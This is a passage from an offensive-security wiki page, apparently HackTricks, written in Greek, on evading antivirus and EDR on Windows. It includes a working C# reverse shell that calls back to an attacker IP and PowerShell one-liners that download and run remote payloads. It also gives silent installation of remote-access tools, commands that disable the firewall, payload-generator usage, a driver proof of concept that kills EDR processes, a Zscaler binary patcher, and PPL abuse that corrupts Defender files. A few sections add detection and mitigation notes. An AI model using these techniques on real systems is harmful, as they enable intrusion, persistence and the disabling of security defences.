Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα χρειαστεί μόνο να ασχοληθούμε με το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, κ.λπ.) ήδη παρέχουν τη δυνατότητα να εκτελούν C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να το κάνετε:

- **Fork\&Run**

Αυτό περιλαμβάνει το **spawn ενός νέου sacrificial process**, την injection του post-exploitation malicious code σε εκείνη τη νέα διεργασία, την εκτέλεση του malicious code και όταν τελειώσει, το τερματισμό της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το όφελος της μεθόδου fork and run είναι ότι η εκτέλεση λαμβάνει χώρα **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι αν κάτι στην post-exploitation ενέργειά μας πάει στραβά ή εντοπιστεί, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant** μας να επιβιώσει. Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Αφορά την injection του post-exploitation malicious code **στην ίδια τη διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και το σκανάρισμά της από το AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** καθώς μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από PowerShell**, δείτε [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες δίνοντας στη compromised machine πρόσβαση **στο interpreter environment εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο περιβάλλον στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες εντός της μνήμης** της compromised machine.

Το repo αναφέρει: Το Defender εξακολουθεί να σκανάρει τα scripts αλλά με τη χρήση Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για να παρακάμψουμε static signatures**. Δοκιμές με τυχαία μη-obfuscated reverse shell scripts σε αυτές τις γλώσσες απέδειξαν επιτυχία.

## TokenStomping

Token stomping είναι μια τεχνική που επιτρέπει σε έναν attacker να **manipulate το access token ή ένα security product όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges του έτσι ώστε η διεργασία να μην πεθαίνει αλλά να μην έχει τα δικαιώματα να ελέγξει για κακόβουλες δραστηριότητες.

Για να αποτραπεί αυτό, τα Windows θα μπορούσαν να **αποτρέπουν εξωτερικές διεργασίες** από το να παίρνουν handles πάνω στα tokens των διεργασιών ασφάλειας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να αναπτύξετε απλά το Chrome Remote Desktop σε ένα θύμα και στη συνέχεια να το χρησιμοποιήσετε για takeover και διατήρηση persistence:
1. Download από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και έπειτα κάντε κλικ στο MSI file for Windows για να κατεβάσετε το MSI.
2. Εκτελέστε τον installer σιωπηλά στο θύμα (απαιτείται admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα Chrome Remote Desktop και κάντε κλικ στο next. Ο wizard θα σας ζητήσει να authorize· πατήστε το Authorize για να συνεχίσετε.
4. Εκτελέστε την παρασχεθείσα παράμετρο με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει τη ρύθμιση του pin χωρίς χρήση του GUI).

## Advanced Evasion

Το evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς αόρατοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον που αντιμετωπίζετε θα έχει τα δικά του δυνατά και αδύναμα σημεία.

Σας προτρέπω έντονα να παρακολουθήσετε αυτή την ομιλία από [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε ένα foothold στις πιο Advanced Evasion τεχνικές.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) που θα **remove parts of the binary** μέχρι να **βρει ποιο μέρος το Defender** θεωρεί κακόβουλο και να σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο** είναι το [**avred**](https://github.com/dobin/avred) με μια ανοιχτή web υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιείχαν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάνε το να **ξεκινά** όταν το σύστημα ξεκινά και **τρέξε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή telnet port** (κρυφά) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Εκτελέστε _**winvnc.exe**_ και διαμορφώστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε κωδικό στο _VNC Password_
- Ορίστε κωδικό στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **πρόσφατα** δημιουργημένο αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα** στο **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμο** να πιάσει μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσετε τη διακριτικότητα, μην κάνετε τα εξής

- Μην ξεκινήσετε το `winvnc` αν τρέχει ήδη ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν τρέχει με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς `UltraVNC.ini` στον ίδιο φάκελο ή θα ανοίξει [το config window](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια γιατί θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη process πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρήση compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης python για δημιουργία injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από τον χώρο του kernel

Το Storm-2603 αξιοποίησε ένα μικρό βοηθητικό κονσόλας γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις endpoint προστασίες πριν αφήσει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελέσει προνομιούχες λειτουργίες kernel που ακόμη και οι υπηρεσίες AV Protected-Process-Light (PPL) δεν μπορούν να μπλοκάρουν.

Κύρια σημεία
1. **Signed driver**: Το αρχείο που γράφεται στο δίσκο είναι `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το Antiy Labs’ “System In-Depth Analysis Toolkit”. Εφόσον ο driver φέρει έγκυρη υπογραφή Microsoft, φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργοποιημένο.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματίζει μια αυθαίρετη διεργασία κατά PID (χρησιμοποιείται για να σκοτώσει υπηρεσίες Defender/EDR) |
| `0x990000D0` | Διαγράφει αυθαίρετο αρχείο από τον δίσκο |
| `0x990001D0` | Απεγκαθιστά τον driver και αφαιρεί την υπηρεσία |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει εντελώς τις user-mode προστασίες· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* διεργασίες, να τις τερματίσει ή να παραποιήσει αντικείμενα του kernel ανεξάρτητα από PPL/PP, ELAM ή άλλα hardening features.

Ανίχνευση / Αντιμετώπιση
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.  
•  Παρακολουθείτε τη δημιουργία νέων *kernel* υπηρεσιών και ειδοποιήστε όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή όταν δεν υπάρχει στη λίστα επιτρεπτών.  
•  Επιβλέπετε για user-mode handles προς custom device objects και ύποπτες κλήσεις `DeviceIoControl` στη συνέχεια.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες device-posture και βασίζεται στο Windows RPC για να μεταφέρει τα αποτελέσματα σε άλλα συστατικά. Δύο αδύναμες σχεδιαστικές επιλογές επιτρέπουν πλήρη bypass:

1. Η αξιολόγηση posture γίνεται **πλήρως client-side** (στέλνεται απλά ένα boolean στον server).  
2. Τα εσωτερικά RPC endpoints επαληθεύουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε (ακόμη και unsigned) διεργασία μπορεί να bind-άρει στις RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Παρακάμφθηκαν |

Ελάχιστο απόσπασμα του patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι έλεγχοι κατάστασης (posture checks) εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Το συμβιβασμένο host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές της Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς αποκλειστικά αποφάσεις εμπιστοσύνης στην πλευρά του client και απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικά byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level ώστε μόνο προστατευμένες διεργασίες ίσου ή ανώτερου επιπέδου να μπορούν να παρεμβαίνουν η μία στην άλλη. Επιθετικά, αν μπορείτε νόμιμα να εκκινήσετε ένα PPL-enabled binary και να ελέγξετε τα arguments του, μπορείτε να μετατρέψετε μια ανώδυνη λειτουργία (π.χ., logging) σε ένα περιορισμένο, PPL-backed write primitive κατά των προστατευμένων καταλόγων που χρησιμοποιούνται από AV/EDR.

Τι κάνει μια διαδικασία να τρέχει ως PPL
- Το στοχευόμενο EXE (και τυχόν φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένο με ένα PPL-capable EKU.
- Η διαδικασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα συμβατό protection level που να ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` δημιουργεί αυτόνομο process και δέχεται μια παράμετρο για να γράψει ένα log αρχείο σε μονοπάτι που καθορίζεται από τον καλούντα.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- Λίστα short names: `dir /x` σε κάθε parent directory.
- Εξαγωγή short path στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας ένα launcher (π.χ. CreateProcessAsPPL).
2) Περάστε το ClipUp log-path argument για να εξαναγκάσετε τη δημιουργία αρχείου σε ένα προστατευμένο AV directory (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά το boot πριν ξεκινήσει το AV εγκαθιστώντας μια auto-start service που εκτελείται πιο νωρίς. Επαληθεύστε το boot ordering με Process Monitor (boot logging).
4) Κατά το reboot η PPL-backed εγγραφή συμβαίνει πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target αρχείο και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέραν της τοποθέτησης· το primitive είναι κατάλληλο για καταστροφή/φθορά παρά για ακριβή εισαγωγή περιεχομένου.
- Απαιτεί τοπικό admin/SYSTEM για να εγκαταστήσετε/εκκινήσετε μια υπηρεσία και ένα παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση (boot-time) αποφεύγει το κλείδωμα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει parent από μη-τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να auto-start ύποπτα binaries και που ξεκινούν επανειλημμένα πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσίας πριν από σφάλματα εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR telemetry: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από non-AV binaries.

Μέτρα μετριασμού
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέχουν ως PPL και υπό ποιους parents· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων contexts.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε χειρισμούς της σειράς εκκίνησης.
- Βεβαιωθείτε ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· ερευνήστε σφάλματα εκκίνησης που υποδεικνύουν φθορά δυαδικών αρχείων.
- Σκεφτείτε την απενεργοποίηση της 8.3 short-name generation σε volumes που φιλοξενούν εργαλεία ασφαλείας, αν είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

Αναφορές για PPL και εργαλεία
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
